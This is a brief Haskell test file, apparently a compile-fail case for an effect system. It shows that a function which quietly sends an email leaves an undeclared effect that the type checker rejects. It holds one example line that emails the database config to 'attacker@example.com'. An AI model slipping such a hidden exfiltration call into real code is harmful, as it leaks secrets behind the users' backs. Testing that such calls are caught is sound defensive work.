{-# LANGUAGE DataKinds, FlexibleContexts #-}
-- fetchUser tries to send an email: that effect isn't in its type.
-- expects: Could not deduce ‘Member SendEmail r’
module SneakEmail where

import Effects
import Users

fetchUser' :: Members '[Reader DbConfig, Error NotFound] r
           => UserId -> Eff r User
fetchUser' uid = do
  sendEmail "attacker@example.com" "here's the db config"
  fetchUser uid
